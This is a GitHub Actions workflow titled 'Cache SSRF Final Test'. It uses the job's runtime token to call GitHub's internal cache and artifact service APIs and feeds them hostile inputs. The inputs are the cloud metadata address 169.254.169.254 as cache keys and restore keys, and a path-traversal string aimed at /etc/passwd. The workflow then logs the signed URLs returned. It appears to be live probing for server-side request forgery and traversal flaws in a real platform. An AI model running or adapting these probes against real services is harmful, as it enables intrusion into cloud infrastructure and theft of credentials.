name: Cache SSRF Final Test

on:
  workflow_dispatch:

permissions:
  contents: read
  actions: read

jobs:
  test-cache-create-with-proper-format:
    runs-on: ubuntu-latest
    steps:
      - name: Create cache entry and analyze signed URL
        uses: actions/github-script@v7
        with:
          script: |
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            const crypto = require('crypto');
            
            console.log("=== CACHE ENTRY CREATION WITH PROPER FORMAT ===");
            console.log("Results URL:", resultsUrl);
            
            // Generate a proper 64-char version hash like the real cache action does
            const generateVersion = (paths) => {
              const hash = crypto.createHash('sha256');
              hash.update(paths.join('|'));
              return hash.digest('hex');
            };
            
            const version = generateVersion(['/tmp/test']);
            console.log("Generated version:", version, "(", version.length, "chars)");
            
            const testEntries = [
              { key: `test-ssrf-${Date.now()}`, version: version },
              { key: `http://169.254.169.254/latest/`, version: version },
              { key: `..\\..\\..\\etc\\passwd`, version: version },
            ];
            
            for (const entry of testEntries) {
              console.log(`\n--- Testing key: ${entry.key} ---`);
              
              const url = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry`;
              try {
                const res = await fetch(url, {
                  method: 'POST',
                  headers: {
                    'Authorization': `Bearer ${runtimeToken}`,
                    'Content-Type': 'application/json'
                  },
                  body: JSON.stringify(entry)
                });
                const text = await res.text();
                console.log(`Status: ${res.status}`);
                console.log(`Response: ${text}`);
                
                // If we got a signed URL, analyze it
                if (res.status === 200) {
                  try {
                    const parsed = JSON.parse(text);
                    console.log("*** SUCCESS - Parsed response ***");
                    console.log(JSON.stringify(parsed, null, 2));
                    if (parsed.signed_upload_url) {
                      const urlObj = new URL(parsed.signed_upload_url);
                      console.log("Signed URL host:", urlObj.host);
                      console.log("Signed URL path:", urlObj.pathname);
                    }
                  } catch (e) {
                    console.log("Parse error:", e.message);
                  }
                }
              } catch (e) {
                console.log(`Error: ${e.message}`);
              }
            }

      - name: Test GetCacheEntryDownloadURL with proper format
        uses: actions/github-script@v7
        with:
          script: |
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            const crypto = require('crypto');
            
            console.log("=== CACHE DOWNLOAD URL TEST ===");
            
            const version = crypto.createHash('sha256').update('/tmp/test').digest('hex');
            
            const testKeys = [
              { key: "test-normal", version: version, restore_keys: [] },
              { key: "http://169.254.169.254/", version: version, restore_keys: [] },
              { key: "test", version: version, restore_keys: ["http://169.254.169.254/"] },
            ];
            
            for (const entry of testKeys) {
              console.log(`\n--- Testing: ${JSON.stringify(entry)} ---`);
              
              const url = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL`;
              try {
                const res = await fetch(url, {
                  method: 'POST',
                  headers: {
                    'Authorization': `Bearer ${runtimeToken}`,
                    'Content-Type': 'application/json'
                  },
                  body: JSON.stringify(entry)
                });
                const text = await res.text();
                console.log(`Status: ${res.status}`);
                console.log(`Response: ${text.substring(0, 500)}`);
              } catch (e) {
                console.log(`Error: ${e.message}`);
              }
            }

  test-artifact-download-manipulation:
    runs-on: ubuntu-latest
    steps:
      - name: Upload and analyze artifact URLs
        uses: actions/upload-artifact@v4
        with:
          name: ssrf-test-artifact
          path: /etc/hostname
          
      - name: Get signed download URL via API
        uses: actions/github-script@v7
        with:
          script: |
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
            
            console.log("=== ARTIFACT DOWNLOAD URL ANALYSIS ===");
            
            // List artifacts first
            const listUrl = `${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts`;
            console.log("Listing artifacts...");
            
            const listRes = await fetch(listUrl, {
              method: 'POST',
              headers: {
                'Authorization': `Bearer ${runtimeToken}`,
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                workflow_run_backend_id: process.env.GITHUB_RUN_ID,
                workflow_job_run_backend_id: process.env.GITHUB_JOB
              })
            });
            
            const listText = await listRes.text();
            console.log(`List Status: ${listRes.status}`);
            console.log(`List Response: ${listText}`);
            
            // Try to get download URL
            if (listRes.status === 200) {
              try {
                const artifacts = JSON.parse(listText);
                if (artifacts.artifacts && artifacts.artifacts.length > 0) {
                  const artifactId = artifacts.artifacts[0].database_id || artifacts.artifacts[0].id;
                  console.log(`\nGetting download URL for artifact: ${artifactId}`);
                  
                  const downloadUrl = `${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL`;
                  const downloadRes = await fetch(downloadUrl, {
                    method: 'POST',
                    headers: {
                      'Authorization': `Bearer ${runtimeToken}`,
                      'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                      workflow_run_backend_id: process.env.GITHUB_RUN_ID,
                      workflow_job_run_backend_id: process.env.GITHUB_JOB,
                      name: 'ssrf-test-artifact'
                    })
                  });
                  
                  const downloadText = await downloadRes.text();
                  console.log(`Download URL Status: ${downloadRes.status}`);
                  console.log(`Download URL Response: ${downloadText}`);
                  
                  // Analyze the signed URL
                  if (downloadRes.status === 200) {
                    const parsed = JSON.parse(downloadText);
                    if (parsed.signed_url) {
                      console.log("\n*** SIGNED DOWNLOAD URL ***");
                      const urlObj = new URL(parsed.signed_url);
                      console.log("Host:", urlObj.host);
                      console.log("Path:", urlObj.pathname);
                      console.log("Query params:", urlObj.search);
                    }
                  }
                }
              } catch (e) {
                console.log("Error parsing artifacts:", e.message);
              }
            }
